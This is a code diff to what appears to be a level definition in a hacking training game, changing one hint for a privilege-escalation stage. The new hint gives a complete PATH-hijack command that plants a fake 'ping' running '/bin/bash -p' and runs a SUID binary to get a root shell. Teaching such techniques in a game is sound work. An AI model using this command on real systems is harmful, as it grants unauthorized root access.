@@ -45,7 +45,7 @@ export const hardLevel2: ChainDef = {
       ],
       hints: [
         "Outdated software usually means a public exploit already exists for it — find out exactly what's running before you go looking for one.",
-        "Once you're in, permissions are your friend. Anything running with more privilege than it should is worth a very close look — and worth asking what commands it trusts blindly.",
+        "Once you're in, permissions are your friend. Anything running with more privilege than it should is worth a very close look — and worth asking what commands it trusts blindly. Once you've found the SUID binary and the command it shells out to without an absolute path, hijack PATH ahead of it: `echo '/bin/bash -p' > /tmp/ping && chmod +x /tmp/ping && export PATH=/tmp:$PATH && /usr/local/bin/netcheck`.",
       ],
       debrief: [],
       commands: [
